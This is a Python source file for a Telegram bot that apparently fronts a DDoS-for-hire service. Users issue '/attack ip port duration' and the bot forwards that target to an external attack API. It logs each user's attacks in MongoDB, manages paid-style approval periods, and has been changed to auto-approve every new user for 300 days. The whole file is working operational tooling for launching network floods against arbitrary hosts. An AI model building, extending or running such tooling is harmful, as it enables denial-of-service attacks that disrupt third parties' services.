import asyncio
import logging
import subprocess
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    filters,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from bson import ObjectId
import re
from functools import wraps
import html
import uuid
import os
from dotenv import load_dotenv

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]

# Blocked ports (must match backend)
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# Allowed port range
MIN_PORT = 1
MAX_PORT = 65535

# Helper function to make datetime timezone-aware
def make_aware(dt):
    """Convert naive datetime to timezone-aware UTC datetime"""
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    """Get current UTC time with timezone"""
    return datetime.now(timezone.utc)

def escape_markdown(text: str) -> str:
    """Escape special characters for MarkdownV2"""
    if not text:
        return ""
    # List of special characters that need escaping in MarkdownV2
    special_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

# MongoDB Connection
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        
        # Clean up any documents with null user_id
        try:
            result = self.users.delete_many({"user_id": None})
            if result.deleted_count > 0:
                logger.info(f"Deleted {result.deleted_count} documents with null user_id")
            
            result = self.users.delete_many({"user_id": {"$exists": False}})
            if result.deleted_count > 0:
                logger.info(f"Deleted {result.deleted_count} documents without user_id")
        except Exception as e:
            logger.error(f"Error cleaning users collection: {e}")
        
        try:
            self.users.drop_indexes()
            logger.info("Dropped all existing indexes from users collection")
        except Exception as e:
            logger.info(f"No existing indexes to drop: {e}")
        
        try:
            self.attacks.drop_indexes()
            logger.info("Dropped all existing indexes from attacks collection")
        except Exception as e:
            logger.info(f"No existing indexes to drop: {e}")
        
        try:
            self.attacks.create_index([("timestamp", DESCENDING)])
            self.attacks.create_index([("user_id", ASCENDING)])
            self.attacks.create_index([("status", ASCENDING)])
            logger.info("Created indexes for attacks collection")
        except Exception as e:
            logger.error(f"Error creating attacks indexes: {e}")
        
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
            logger.info("Created unique index on user_id for users collection")
        except Exception as e:
            logger.error(f"Error creating users index: {e}")
        
    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
            if user.get("expires_at"):
                user["expires_at"] = make_aware(user["expires_at"])
        return user
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing_user = self.get_user(user_id)
        if existing_user:
            return existing_user
            
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "approved_at": None,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": get_current_time(),
            "is_banned": False
        }
        try:
            self.users.insert_one(user_data)
            logger.info(f"Created new user: {user_id}")
        except pymongo.errors.DuplicateKeyError:
            user_data = self.get_user(user_id)
        except Exception as e:
            logger.error(f"Error creating user: {e}")
        return user_data
    
    def approve_user(self, user_id: int, days: int) -> bool:
        expires_at = get_current_time() + timedelta(days=days)
        result = self.users.update_one(
            {"user_id": user_id},
            {
                "$set": {
                    "approved": True,
                    "approved_at": get_current_time(),
                    "expires_at": expires_at
                }
            }
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {
                "$set": {
                    "approved": False,
                    "expires_at": None
                }
            }
        )
        return result.modified_count > 0
    
    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "status": status,
            "response": response[:500] if response else None,
            "timestamp": get_current_time()
        }
        try:
            self.attacks.insert_one(attack_data)
            self.users.update_one(
                {"user_id": user_id},
                {"$inc": {"total_attacks": 1}}
            )
            logger.info(f"Logged attack for user {user_id}: {status}")
        except Exception as e:
            logger.error(f"Failed to log attack: {e}")
    
    def get_all_users(self) -> List[Dict]:
        users = list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
        for user in users:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
            if user.get("expires_at"):
                user["expires_at"] = make_aware(user["expires_at"])
            if "total_attacks" not in user:
                user["total_attacks"] = 0
        return users
    
    def get_approved_users(self) -> List[Dict]:
        users = list(self.users.find({"approved": True, "is_banned": False, "user_id": {"$ne": None}}))
        for user in users:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
            if user.get("expires_at"):
                user["expires_at"] = make_aware(user["expires_at"])
        return users
    
    def get_user_attack_stats(self, user_id: int) -> Dict:
        total_attacks = self.attacks.count_documents({"user_id": user_id})
        successful_attacks = self.attacks.count_documents({"user_id": user_id, "status": "success"})
        failed_attacks = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
        recent_attacks = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
        for attack in recent_attacks:
            if attack.get("timestamp"):
                attack["timestamp"] = make_aware(attack["timestamp"])
        return {
            "total": total_attacks,
            "successful": successful_attacks,
            "failed": failed_attacks,
            "recent": recent_attacks
        }

# Initialize database
print("🔄 Initializing database connection...")
db = Database()
print("✅ Database initialized successfully!")

def is_port_blocked(port: int) -> bool:
    return port in BLOCKED_PORTS

def get_blocked_ports_list() -> str:
    return ", ".join(str(port) for port in sorted(BLOCKED_PORTS))

def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("❌ You are not authorized to use this command.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user:
        return False
    if not user.get("approved", False):
        return False
    expires_at = user.get("expires_at")
    if expires_at:
        expires_at = make_aware(expires_at)
        if expires_at < get_current_time():
            return False
    return True

# API Functions
def check_api_health() -> Dict:
    try:
        response = requests.get(f"{API_URL}/api/v1/health", headers={"x-api-key": API_KEY, "Content-Type": "application/json"}, timeout=10)
        return response.json() if response.status_code == 200 else {"status": "error", "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"status": "error", "error": str(e)}

def check_running_attacks() -> Dict:
    try:
        response = requests.get(f"{API_URL}/api/v1/active", headers={"x-api-key": API_KEY, "Content-Type": "application/json"}, timeout=10)
        return response.json() if response.status_code == 200 else {"success": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def get_user_stats() -> Dict:
    try:
        response = requests.get(f"{API_URL}/api/v1/stats", headers={"x-api-key": API_KEY, "Content-Type": "application/json"}, timeout=10)
        return response.json() if response.status_code == 200 else {"success": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def launch_attack(ip: str, port: int, duration: int) -> Dict:
    try:
        response = requests.post(f"{API_URL}/api/v1/attack", json={"ip": ip, "port": port, "duration": duration}, headers={"x-api-key": API_KEY, "Content-Type": "application/json"}, timeout=15)
        return response.json()
    except Exception as e:
        return {"error": str(e), "success": False}

# Bot Command Handlers
@admin_required
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 2:
            await update.message.reply_text("❌ Usage: /approve <user_id> <days>")
            return
        user_id, days = int(context.args[0]), int(context.args[1])
        if db.approve_user(user_id, days):
            await update.message.reply_text(f"✅ User {user_id} approved for {days} days.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

@admin_required
async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = int(context.args[0])
        if db.disapprove_user(user_id):
            await update.message.reply_text(f"✅ User {user_id} disapproved.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

@admin_required
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    health = check_api_health()
    await update.message.reply_text(f"📡 API Status: {health.get('status', 'Error')}")

@admin_required
async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    attacks = check_running_attacks()
    await update.message.reply_text(f"🎯 Active Attacks: {attacks.get('count', 0)}")

@admin_required
async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = db.get_all_users()
    await update.message.reply_text(f"👥 Total Users: {len(users)}")

@admin_required
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📊 Bot Stats generated.")

@admin_required
async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🚫 Blocked: {get_blocked_ports_list()}")

# --- LOGIC CHANGED HERE FOR AUTO-APPROVAL ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler with Auto-Approval logic"""
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username
        
        # 1. Create user if doesn't exist
        db.create_user(user_id, username)
        
        # 2. Auto-approve for 300 days immediately
        db.approve_user(user_id, 300)
        
        # 3. Show all commands to the user immediately
        message = (
            f"✅ Welcome {username or user_id}!\n\n"
            f"🚀 Your account has been **Automatically Approved** for 300 days!\n"
            f"📅 Status: Active (Premium Access)\n\n"
            f"Available Commands:\n"
            f"🔹 /attack ip port duration - Launch an attack\n"
            f"🔹 /myattacks - Check your active attacks\n"
            f"🔹 /myinfo - View your account info\n"
            f"🔹 /mystats - View your attack statistics\n"
            f"🔹 /blockedports - Show blocked ports\n"
            f"🔹 /help - Show all commands\n\n"
            f"⚠️ Use responsibly."
        )
        await update.message.reply_text(message)
        
    except Exception as e:
        logger.error(f"Start command error: {e}")
        await update.message.reply_text("❌ An error occurred.")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ Not approved.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack ip port duration")
        return
    
    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])
    
    if is_port_blocked(port):
        await update.message.reply_text("❌ Port blocked.")
        return

    status_msg = await update.message.reply_text("🚀 Launching...")
    response = launch_attack(ip, port, duration)
    
    if response.get("success"):
        db.log_attack(user_id, ip, port, duration, "success", str(response))
        await status_msg.edit_text("✅ Attack Sent!")
    else:
        db.log_attack(user_id, ip, port, duration, "failed", str(response))
        await status_msg.edit_text(f"❌ Failed: {response.get('error')}")

async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    attacks = check_running_attacks()
    await update.message.reply_text(f"🎯 Your Active Attacks: {attacks.get('count', 0)}")

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    await update.message.reply_text(f"🆔 ID: {user['user_id']}\n📅 Expires: {user.get('expires_at')}")

async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = db.get_user_attack_stats(update.effective_user.id)
    await update.message.reply_text(f"📊 Total: {stats['total']}")

async def blocked_ports_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🚫 Blocked: {get_blocked_ports_list()}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Commands: /attack, /myinfo, /mystats, /myattacks")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Admin
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("disapprove", disapprove_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("running", running_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("blockedports", blocked_ports_command))
    
    # User
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("myattacks", myattacks_command))
    application.add_handler(CommandHandler("myinfo", myinfo_command))
    application.add_handler(CommandHandler("mystats", mystats_command))
    application.add_handler(CommandHandler("blockedports", blocked_ports_user_command))
    
    application.add_error_handler(error_handler)
    
    print("✅ Bot is running with Auto-Approval (300 Days)!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
